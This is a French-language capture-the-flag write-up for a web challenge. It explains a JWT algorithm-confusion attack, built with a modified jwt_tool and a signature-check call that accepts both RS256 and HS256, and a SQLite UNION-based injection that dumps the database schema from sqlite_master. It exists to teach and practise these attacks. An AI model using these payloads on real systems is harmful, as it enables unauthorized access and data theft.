\section{Under Construction}
Keywords: web, \gls{jwt} \gls{jwt confusion}, \gls{sqlite}, \gls{sql injection}

\subsection{Résumé}

On peut créer un compte et se connecter avec. Par contre rien si ce  n'est que le nom du user créé est affiché.


Le code source focurni montre que le nom du user vient d'une requete en bdd.
mais que le nom recherché provient du \verb+AuthMiddleware+

\begin{verbatim}
router.get('/', AuthMiddleware, async (req, res, next) => {
    try{
        let user = await DBHelper.getUser(req.data.username);
        if (user === undefined) {
            return res.send(`user ${req.data.username} doesn't exist in our database.`);
        }
        return res.render('index.html', { user });
    }catch (err){
        return next(err);
    }
});
\end{verbatim}

le \verb+AuthMiddleware+ utilise \verb+JWTHelper.decode(req.cookies.session);+
pour récupérer le username.

la fonction est \verb+JWTHelper.decode+  vulnérable à l'attaque jwt confusion
\begin{verbatim}
    async decode(token) {
        return (await jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] }));
    }
\end{verbatim}

\subsubsection{JWT confusion exploit}

Pour crafter l'attaque j'utilise
\href{https://github.com/ticarpi/jwt_tool}{jwt\_tool} que je suis obligé de
modifier pour pouvoir utiliser le jwt tampering avec l'attaque par confusion

La modification est quick and dirty. Dans la fonction \verb+runExploits+ je
rajoute une ligne juste avant l'appel à la fonction \verb+checkPubKeyExploit+
pour pouvoir encodeer le payload modifié:

\begin{verbatim}
paylB64 = base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
\end{verbatim}

ce qui permet d'utiliser :
\begin{verbatim}
./jwt_tool.py $JWT_TOKEN -T -X k -pk ../key.pem
\end{verbatim}

On ne modifie que le payload car l'entête est automatique réécrite

Pour obtenir la clé il suffit d'analyser le token de base et de coller dans un
fichier.


\subsubsection{SQL injection}

Pour l'injection SQL

je part sur un username qui n'existe pas plus un \verb+UNION SELECT 1+

ce qui donne:
\begin{verbatim}
toto' UNION SELECT 1--
\end{verbatim}

on obtient : 
\begin{verbatim}
Error: SQLITE_ERROR: SELECTs to the left and right of 
    UNION do not have the same number of result columns
\end{verbatim}

on continu et à la fin on a besoin de 3 champ dont le second est reflected.

on craft donc une exfiltration de la structure de la BDD

\verb+UNION SELECT 1,(SELECT group_concat(sql) FROM sqlite_master),3;--+

puis on sait ou aller chercher.

\subsection{Theorie}
\subsection{JWT (key) Confusion}

Cette attaque consiste à utiliser la clé publique d'un algo de chiffrement
asymetrique \verb+RSxxx+ comme clé de chiffrement symetrique en modifiant le
header pour passer à du \verb+HSxxx+.

Cela est notamment possible quand la fonction suivante est implémentée:
\begin{verbatim}
jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] }))
\end{verbatim}



\subsection{links}

\begin{itemize}
    \item \href{https://jwt.io/}{jwt.io}
    \item \href{https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet}{SQLite SQL Injection Cheat Sheet}
    \item \href{https://github.com/ticarpi/jwt_tool}{jwt\_tool}

\end{itemize}


